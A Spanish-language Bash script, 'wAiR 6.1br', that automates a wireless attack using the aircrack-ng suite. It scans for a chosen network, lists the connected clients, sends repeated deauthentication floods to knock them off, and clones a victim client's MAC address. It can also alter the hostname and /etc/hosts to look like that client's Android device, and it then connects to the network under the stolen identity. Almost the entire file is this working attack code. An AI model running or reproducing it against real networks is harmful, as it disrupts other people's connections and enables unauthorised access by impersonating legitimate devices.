#!/usr/bin/bash

BINPATH1=/usr/sbin/
BINPATH=/usr/bin/
capturaPath="/dev/shm/secOff"
logfile=/dev/shm/wAiR.log
capturaTodel="$(echo -n $capturaPath*)"
#CMD
rm $capturaTodel 2>$logfile
#FCMD
captura="$capturaPath-01.csv"
pt="[$(echo -n $(setterm --foreground green)+$(setterm --foreground default))]"
skip="[$(echo -n $(setterm --foreground red)+)$(setterm --foreground default)]"
antenna="$(echo -n 📡)"
shark="$(echo -n 🦈)"
movil="$(echo -n 📱)"
deauth="$(echo -n 📳)"
radio="$(echo -n 📻)"
clear
if [[ $3 == "-d" ]];then
echo "bash -x $(pwd)/$0 $@"
exit
fi
function help_banner(){
echo '
              ___ ____
__      ___ _|_-_|- _-\  __     __
\-\ /\ /-/-_`-|-|-|_)-|  \-\ - /-/
 \-V--V-/ (_|-|-|- _-<    \-\|/-/
  \_/\_/ \__\___|_| \_\   /-/|\-\    6.1br
                         /-/ - \-\
                        /_/     \_\

                           v6.1br [ Depurada y Creada por M0ffswX]
				      	[ Este software es solo de uso privado ].

'
}

if [[ $(whoami) == "root" ]];then
   echo -n ""

else
   help_banner
   echo "$skip Privilegios Pobres.. Necesitas ejecutar el programa como usuario root"
exit
fi

help_banner
if [[ $(which airodump-ng|wc -l) == "0" ]]; then
   echo $pt Necesitas instalar la suite aircrack
else
   echo $pt Requisitos minimos para ejecutar la Aplicacion cumplidos...
fi
nmcli dev status
if [[ $(airmon-ng |grep phy[0-9]|wc -l) == "1" ]];then
   echo $pt Usando Interface Predeterminado : [$(airmon-ng|grep phy[0-9]|awk '{print $2"] - ["$3}')]
   iwan="$(airmon-ng |grep -v Inter|grep phy[0-9]|awk '{print $2}'|sort -u)"
   echo $iwan &>/tmp/iwd2v190832
else
   echo $pt Mas de 1 Interface conectado...
   echo -en "\n$pt Dispositivos disponibles:\n$(airmon-ng|grep phy|awk '{print " "$2" \\\\ ["$3"] \\\\ "$4,$5,$6,$7""}')\n"
   read -p "Nombre del Interface de red: " iwan
      if [[ $iwan == "" ]];then
         echo $skip Adaptador no valido.
         exit
      fi

      if [[ $(airmon-ng|grep $iwan|awk '{print $2" \\\\ ["$3"] \\\\ "$4,$5,$6,$7""}'|wc -l) == "0" ]];then
      echo $skip Adaptador no valido.
      exit
         else
      echo $pt Adaptador obtenido
      echo $pt Desbloqueando Interface
         for i in {1..5};do
            rfkill unblock $i &>>/dev/shm/logs_wair
         done

      fi
   echo $pt - [$(airmon-ng|grep phy[0-9]|awk '{print $2"] - ["$3}')]
   read -p "Intruduce el nombre del interface: " iwan
      if [[ $(airmon-ng|grep phy[0-9]|grep $iwan) == "" ]];then
         echo $skip Interface no existente
         echo "" &>/tmp/iwd2v190832
         exit
      else
         echo $pt Interface existente: $iwan
      fi
         
fi


#restart_process
echo -en "\n"
function sdevice(){
   if [[ "$2" == "" ]];then
      echo Dispositivo WLAN no escrito
      exit
   fi
   echo Dispositivo WLAN : $2
   echo

}
function rserver(){

   echo   $pt Reiniciando procesos  [systemd-resolved]...
   systemctl restart systemd-resolved>>$logfile
   echo  $pt Reiniciando procesos  [systemd-resolved]...
   echo   $pt Reiniciando procesos  [NetworkManager]...
   systemctl restart NetworkManager>>$logfile
   echo  $pt Reiniciando procesos  [NetworkManager]...
   echo   $pt Reiniciando procesos  [networking]...
   systemctl restart networking>>$logfile
   echo  $pt Reiniciando procesos  [networking]...
   exit

}

if  [[ "$3" == "restart_process" ]];then
   rserver
fi
#testing BETA

if [[ "$1" == "show_device_info" ]];then
   sdevice
fi
#finish_BETA

if  [[ "$1" == "" ]];then
	echo -ne 'Argumentos : \n\n restart_process        - Restablece los Procesos de la red \n SSID(Nombre de la red) - Inicia el escaneo en busca de clientes y verifica la atentificacion con el mismo. \n show_device_info       - Muestra Informacion Referente al dispositivo Wireless\n stop_services          -  Apaga servicios relacionados con las redes'
	exit
fi
#AYUDAFIN

echo $pt Verificando Procesos activos
if [[ $( ps -aux|grep airodump-ng|grep -v grep |awk '{print $2}'|wc -l) == "0" ]];then
	echo -n
else
	echo $pt  Procesos del escaner activos, cerrando...
	for i in $( ps -aux|grep airodump-ng|grep -v grep |awk '{print $2}');do
		kill -9 $i
	done
fi

   iwan=$(cat /tmp/iwd2v190832)
   if [[ $3 == "--no-check" ]];then
        echo $pt $skip Cerrando Procesos
   else
	    echo $pt  Cerrando Procesos
       airmon-ng check kill &>$logfile
   fi
   
   iwan="$(cat /tmp/iwd2v190832)"
   
   if [[ $(iwconfig $iwan|grep -w Mode:Managed|wc -l) == "1" ]];then
	   echo   $pt Iniciando Modo Monitor...
      airmon-ng start "$iwan" >>$logfile
	   iwan="$(airmon-ng |grep -v Inter|grep phy[0-9]|grep $(cat /tmp/iwd2v190832) |awk '{print $2}'|uniq)"
      echo $pt Interface en modo monitor: $iwan
   else
      iwan="$iwan"
      echo   $skip Iniciando Modo Monitor [Existente: $iwan]...
   fi
ifconfig "$iwan" down && macchanger -r "$iwan" >$logfile
macchanger -r "$iwan" >$logfile && macchanger -r "$iwan" >$logfile && macchanger -r "$iwan" >$logfile 
ifconfig "$iwan" up
echo   $pt $shark  Mac Address "$(setterm --foreground red;macchanger -s $iwan|grep Current|awk '{print $3}')">$logfile
setterm --foreground default

airodump-ng -a -w $capturaPath  $iwan &>$logfile 1>$logfile 2>$logfile &
ap=$2
echo $2 >/tmp/ac2i3jf2kg3l1
echo "1">/tmp/asl201l21
ap=$(cat /tmp/ac2i3jf2kg3l1)
if [ -f "$captura" ];then
echo -en "$pt $antenna Esperando Datos Necesarios. \n"
else
	sleep 3
fi
echo -n $pt $radio  Obteniendo Informacion Basica del entorno
sleep 2

for i in {1..60000};do
if [[ $( du  $captura|awk '{print $1}' ) == "0" ]];then
	echo -n "."
   sleep 0.80
else
	echo -n ""
	break
fi

if [[ -f "$captura" ]]; then
   echo -n ""
else
   echo -en "\n$skip Fichero de Captura no encontrado...\n"
   exit
fi
done
echo -en "\n"
echo $pt  Datos Obtenidos...
echo 0 > /tmp/f29013uj2i93h1j23phkjasd0-j2io3492i1290
echo -n $pt Buscando Datos del AP: [
for i in {1..120};do
	sleep 0.30
if [[ $(echo $(cat $captura |grep $(cat /tmp/ac2i3jf2kg3l1)|awk '{print $1}'|sed 's/,//g')) == "" ]];then
		echo -n .
	else
		echo $i > /tmp/f29013uj2i93h1j23phkjasd0-j2io3492i1290
			if [[ $(cat  /tmp/f29013uj2i93h1j23phkjasd0-j2io3492i1290|wc -l) == "60" ]];then
				echo -n $pt AP no encontrado.. Tiempo expirado [60s]
				break
			fi
break
fi
done
echo -ne "]"
echo -en "\n"
if [[ $ap == "" ]];then
echo $pt $skip AP no encontrado
echo [+] Fallo al obtener la variable AP
exit
fi
if [[ $(cat $captura |grep "$(cat $captura |grep $(cat $captura |grep $ap|awk '{print $1}'|sed 's/,//g')|grep $ap|awk '{print $1}'|sed 's/,//g')"|grep $ap|awk '{print $1}'|sed 's/,//g') == "" ]];then
	echo -en "\n"
	echo -n $pt  AP MacAddress no encontrado , espere
   echo -en "\n"
   echo -n $pt Iniciando Speed Test.
		for i in {1..1561};do
			if [[ $(cat $captura |grep $(cat $captura |grep $(cat $captura |grep $ap|awk '{print $1}'|sed 's/,//g')|grep $ap|awk '{print $1}'|sed 's/,//g')|grep $ap|awk '{print $1}'|sed 's/,//g') == "" ]];then
				echo -n "."
			else
				break
			fi
		done
else
	echo -en "\n"$pt AP Mac Address:  $(cat $captura |grep "$(cat $captura |grep "$(cat $captura |grep $ap|awk '{print $1}'|sed 's/,//g')"|grep $ap|awk '{print $1}'|sed 's/,//g')"|grep $ap|awk '{print $1}'|sed 's/,//g') ..
fi
echo -en "\n"
echo -en  "$pt Buscando Clientes de [$(cat /tmp/ac2i3jf2kg3l1)] ""\n"
if [[  $(cat $captura|grep $ap|awk '{print $1}'|sed 's/,//g'|wc -l) == "1" ]]; then
   echo -n ""
else
   echo "$skip Posible Suplantacion a $ap.."
fi
echo -n  "["
ap_server=$(cat $captura |grep $ap|grep -v not\ associated|awk '{print $1}'|sed 's/,//g')

for i in {1..99180};do
   if [[ $(cat $captura|grep ", $ap_server,"|wc -l) == "0" ]];then
      sleep 0.50
      echo -n "*"
   else
      echo -en  "]"
      echo 1 > .tmp93210321jh3012
      echo -en "\n"
      setterm --foreground green
      #muestra el Cliente existente en green
      echo -en $(setterm --foreground default)
      echo -en $pt
      echo -en $(setterm --foreground green)
      echo -en $movil Cliente Existente
      setterm --foreground default
      #fin del mensaje
      echo "";
      #DEPRECADO
      #cat $captura|grep ", $ap_server," |sed 's/,/ /g'|awk '{print "CLIENTE: "$1" -  AP MAC: "$8}'
      #END
      clientes=$(cat $captura|grep ", $ap_server," |sed 's/,/ /g'|awk '{print $1}')
      for i in $clientes ;do
         mac=$(echo $i|sed 's/://g'|cut -b 1-5)
         mac_regex=$(cat /usr/share/ieee-data/oui.csv |grep $mac |cut -b13-5000|sed 's/,/\n/'|grep -v ","|sed 's/"//g')
            if [[ $(echo $mac_regex|grep [A-Za-z]) == "" ]];then
               echo -n ""
            else
               echo $pt [$mac_regex] - [$i]|column  -t
            fi
      done

      cat $captura |grep $ap_server |grep -v $ap|awk '{print $1}'|sed 's/,//g'|head -n1 > /tmp/cl1.txt
      airpointCLIENT=$(cat /tmp/cl1.txt)
      channel=$(cat $captura |grep $ap|awk '{print $6}'|sed 's/,//g'|head -n1)
      #channel="$(cat /tmp/cl2.txt)"
      clis=$(cat $captura |grep $ap_server |grep -v $ap|awk '{print $1}'|sed 's/,//g')
      var_airodump=$(killall -9 airodump-ng &>$logfile )
      echo $var_airodump  &>$logfile

   if [[ "$1" == "-d" ]];then
        echo  $pt $deauth Iniciando Modo Deauthentificacion contra $airpointCLIENT
        aireplay-ng -0 1000 -a $ap_server -c $airpointCLIENT $(airmon-ng|grep -v Interface|grep phy|awk '{print $2}'|sort -u)
        echo $pt $deauth Trabajo Sucio Realizado
        echo $pt Saliendo...
   fi

break
         fi


if [[ $i == "250" ]];then
   echo -en "\n\n"$pt $skip Cliente no encontrados : Tiempo Expirado [250s].
   exit
fi

done
if [[ "$(cat .tmp93210321jh3012)" == "1" ]];then
   echo -en ""
else
echo -en  "]" "\n\n"
echo 0 >.tmp93210321jh3012
fi
if  [[ "$channel" == "" ]];then
      echo -en "\n$pt DEBUG CODE [ CH404 ]"
      exit
fi

if  [[ "$airpointCLIENT" == "" ]];then
   echo $pt DEBUG CODE [ APCL404or403 ] =  [$airpointCLIENT]
   exit
fi

if  [[ "$ap_server" == "" ]];then
   echo $pt DEBUG CODE [ APMAC404or403 ] = [$ap_server]
   exit
fi
echo ""
ifconfig  "$iwan" down
macchanger -r "$iwan" >>$logfile
macchanger -r "$iwan" >>$logfile
macchanger -r "$iwan" >>$logfile
macchanger -r "$iwan" >>$logfile
ifconfig "$iwan" up
echo  $pt $shark Mac Address [Change 2.0 ] "$(setterm --foreground red;macchanger -s $iwan|grep Current|awk '{print $3}')"|tee -a $logfile
setterm --foreground default
if  [[ "$channel" == "" ]]
then
help_banner
echo $pt Canal de Red no encontrado... [Vuelve a intentarlo mas tarde]
exit
else
echo  $pt $radio Cambiando de canal inalambrico...
ifconfig "$iwan" down >>$logfile
iwconfig "$iwan" channel $channel>>$logfile
ifconfig "$iwan" up>>$logfile
fi
if  [[ "$airpointCLIENT" == "" ]];then
   echo $airpointCLIENT no es valido como airpointCLIENT
   help_banner
   exit
fi
if  [[ "$ap_server" == "" ]];then
   echo $ap_server no es valido como ap_server
if [[ $3 == "-dbg" ]];then
        echo ""
        echo [+] DEBUG CODE [ M ] 
        echo [+] GOOD MODE [+]
        echo "arg #1 = "$1
        echo "arg #2 = "$2
        echo "args * = "$@
        echo [+] Variables [+]
        echo pt = $pt
        echo iwan = $iwan
        echo ap_server = $ap_server
        echo airpointCLIENT = $airpointCLIENT
        echo channel = $channel
        echo ap = $ap
        echo ap_svr = $ap_server
        echo [+] HOSTNAME ACTUAL : android$(cat /tmp/cl1.txt|sed 's/://g') [+]
        exit
fi
   help_banner
   exit
fi
ifconfig $iwan down
airpointCLIENT="$(cat /tmp/cl1.txt)"
macchanger -m  "$(cat /tmp/cl1.txt)" $iwan >$logfile
ifconfig $iwan up
echo $ap>/tmp/dasd21
cat $captura |grep $ap_server |grep -v $ap|awk '{print $1}'|sed 's/,/\n/g'>/tmp/opnaci0
for i in $(cat /tmp/opnaci0);do
      ap="$(cat /tmp/ac2i3jf2kg3l1)"
      rm /tmp/cl1.txt 2>$logfile
      echo $i>/tmp/cl1.txt
      echo   $pt $shark Cambiando de Cliente $(setterm --foreground blue)$i$(setterm --foreground default)...
      airpointCLIENT="$(cat /tmp/cl1.txt)"
      ap=$(cat /tmp/dasd21)
      ifconfig $iwan down
      macchanger -m  "$(cat /tmp/cl1.txt)" $iwan >$logfile
      ifconfig $iwan up
      echo ""
      aireplay-ng  -0 5  --deauth-rc 25 -a $ap_server -c $airpointCLIENT $iwan |sed 's/Sending 64 directed DeAuth (//g'|sed 's/code /** DEATH CODE ** [/g'|sed 's/)./]/g'|sed 's/STMAC://g'|grep -v Waiting&
      wait
      echo ""
      echo $pt $deauth Verificando autentificacion   [$(setterm --foreground green)$(cat /tmp/cl1.txt)$(setterm --foreground default)]
      echo "">/tmp/logs.
      aireplay-ng -1 2 -T 2 -a $ap_server -h $(cat /tmp/cl1.txt)  $iwan > /tmp/logs.


      cp   /tmp/logs. /media/sf_Desktop/"Log_device[$(cat /tmp/cl1.txt|sed 's/:/-/g')]-[$(echo $ap_server|sed 's/://g')].txt"
         if [[ "$( cat /tmp/logs.|grep Got\ a\ deauthentication|wc -l)" = "1" ]];then
            echo "$pt Waiting Packets..."
            echo "$pt Waiting $(cat /tmp/logs.|grep Got\ a\ deauthentication|sed 's/  Got a deauthentication packet! (Waiting/ /g'|awk '{print $2}') seconds..."
            sleep $(cat /tmp/logs.|grep Got\ a\ deauthentication|sed 's/  Got a deauthentication packet! (Waiting/ /g'|awk '{print $2}')
            aireplay-ng -1 2 -T 2 -a $ap_server -h $(cat /tmp/cl1.txt)  $iwan > /tmp/logs.
         fi

         if   [[ $(cat /tmp/logs.|grep "Association successful :-) (AID: 1)"|wc -l) == "0" ]];then
            echo    [$(setterm --foreground red)+$(setterm --foreground default)] $(setterm --foreground red) Autentificacion fallida $(setterm --foreground default)
            echo $pt [-- RESPONSE -- ]
            cat /tmp/logs.|sort -u|head  -n1
            echo $pt [-- RESPONSE -- ]
            cat /tmp/logs.|sort -u|sort>>/tmp/debug.xyxy
         else

            echo  $pt Autentificacion exitosa    [$(setterm --foreground green)$(cat /tmp/cl1.txt)$(setterm --foreground default)] ...
            echo "$pt $(cat /tmp/logs.|grep AID|sed 's/:-)//g'|head -n1)"
         fi

         if [[ $3 == "-hst" ]];then
            hostnamectl set-hostname android$(cat /tmp/cl1.txt|sed 's/://g')
            echo "
            127.0.0.1	localhost
            127.0.0.1	android$(cat /tmp/cl1.txt|sed 's/://g')
            " >> /etc/hosts
            cat /etc/hosts|sort -u|grep -v android|sort >/tmp/0d2j139g2h31
            echo 127.0.0.1       android$(cat /tmp/cl1.txt|sed 's/://g') >> /tmp/0d2j139g2h31
            cp /tmp/0d2j139g2h31 /etc/hosts
         fi

         if [[ $3 == "-d" ]];then
            echo $pt Desautentificando Objetivo [$(setterm --foreground green)$(cat /tmp/cl1.txt)$(setterm --foreground default)] ...
            aireplay-ng --ignore-negative-one -0 7  --deauth-rc 19 -a $ap_server -c $airpointCLIENT $iwan |sed 's/Sending 64 directed DeAuth (//g'|sed 's/code /** DEATH CODE ** [/g'|sed 's/)./]/g'|sed 's/STMAC://g'|grep -v Waiting&
            wait
            fi


         if [[ $4 == "-d" ]];then
            echo $pt Desautentificando Objetivo [$(setterm --foreground green)$(cat /tmp/cl1.txt)$(setterm --foreground default)] ...
            aireplay-ng --ignore-negative-one -0 7  --deauth-rc 19 -a $ap_server -c $airpointCLIENT $iwan |sed 's/Sending 64 directed DeAuth (//g'|sed 's/code /** DEATH CODE ** [/g'|sed 's/)./]/g'|sed 's/STMAC://g'|grep -v Waiting&
            wait
         fi

phy_data=$(airmon-ng|grep $iwan|awk '{print $1}')
airmon-ng  stop $iwan >$logfile
#Conexion automatica
iwan="$(airmon-ng|grep -v Interface|grep phy[0-9]|grep $phy_data|awk '{print $2}'|sort -u)"
ap_sort=$(cat $captura |grep $ap_server|grep "WPA\|WPS\|OPN"|sed "s/$ap_server/ XXXXXX\n /g"|grep -v XXXXXX|sort -u|sed 's/,/ \n /g'|grep -v "[0-9][0-9]:[0-9][0-9]:[0-9][0-9]"|grep -v '-'|grep "[a-z]\|[A-Z]"|grep -v "WPA\|WPS\|OPN"|sort -u|cut -b 3-100)
/etc/init.d/networking restart||echo $pt Servicio Networking no existente
systemctl restart NetworkManager.service&>$logfile||echo $pt Servicio NetworkManager no existente
echo $pt Intentando Crear Perfil de Red...
#VIEW Conecctions: nmcli con show E
echo $pt Reiniciando Servicios de Red..
sleep 1
apsr=$(echo $ap_sort|awk '{print $1}')
for i in $(nmcli con show |grep $apsr|awk '{print $2}');do
nmcli  connection down $i &>$logfile

      if [[ "$3" == "notfucksavedNetworks" ]];then
         echo Iniciando Modo Bulk [BETA]
      else
         nmcli  connection delete $i &>$logfile
      fi

done
echo "" > /tmp/32-u312g312opjop
rm /tmp/32-u312g312opjop

iw $iwan scan|grep SSID:|grep $apsr |cut -b 8-50   &> /tmp/320-i312
if [[ $(cat /tmp/320-i312|wc -l) == "0" ]];then
echo Obteniedo codigos de enlace
echo -n "[."
for i in {1..1555};do
	iw $iwan scan|grep SSID:|grep $apsr |cut -b 8-50  1> /tmp/320-i312 ||echo -n E
	if [[ $(cat /tmp/320-i312|wc -l) == "0" ]];then
		echo -n .
	else
		ap_sort=$(cat /tmp/320-i312)
		break
	fi
   sleep 2

done
echo -n "]"
echo -en "\n"
else
ap_sort=$(cat /tmp/320-i312)
fi
echo "
nmcli connection add type wifi con-name wAiR-Connection-A-[$(echo $ap_sort|awk '{print $1}')] ifname $iwan ssid '$ap_sort' ipv4.dns 200.55.128.160  mode infrastructure 802-11-wireless.cloned-mac-address $airpointCLIENT 802-11-wireless.bssid $ap_server connection.autoconnect-priority 150 ipv4.dns-search 200.55.128.160|tee -a /tmp/32-u312g312opjop
"|bash
echo $pt $antenna Esperando Conexion...
nmcli  connection up $(cat /tmp/32-u312g312opjop|awk '{print $3}'|sed 's/[()]//g'|sort -u)&
wait
break
done

if  [[ "$3" == "stop_services" ]];then
	echo   $pt Cerrando procesos  [systemd-resolved]...
	systemctl stop systemd-resolved>>$logfile
	echo   $pt Cerrando procesos  [systemd-resolved]...
	echo   $pt Cerrando procesos  [NetworkManager]...
	systemctl stop NetworkManager>>$logfile
	echo   $pt Cerrando procesos  [NetworkManager]...
	echo   $pt Cerrando procesos  [networking]...
	systemctl stop networking>>$logfile
	echo   $pt Cerrando procesos  [networking]...
fi
nmcli dev status &>/tmp/312g03i03123-og120
if [[ $( grep $iwan /tmp/312g03i03123-og120|grep wifi|grep "conectado"|grep wAiR|wc -l) == "1" ]];then
	echo $pt Conexion exitosa
   echo $pt Validando Conexion a red local
      ip=$(ip addr|grep -A2 $iwan|grep "inet "|awk '{print $2}'|sed 's,/,\nXXXXX,g'|grep -v XXXXX)
      if [[ $(ping -c1 $ip|grep from|wc -l) == "1" ]];then
        echo $pt Conexion a internet existente
        echo $pt IP Local: $ip
      else
        echo $pt $skip Conexion a internet no valida
        exit
      fi
	echo $pt Validando Conexion a internet...
        if [[ $(ping -c1 8.8.8.8|grep from|wc -l) == "1" ]];then
        echo $pt Conexion a internet existente
        else
        echo $pt $skip Conexion a internet no valida
        exit
        fi
	exit
else
	echo $skip Conexion Fallida
	exit
fi
rm .tmp93210321jh3012 &>$logfile
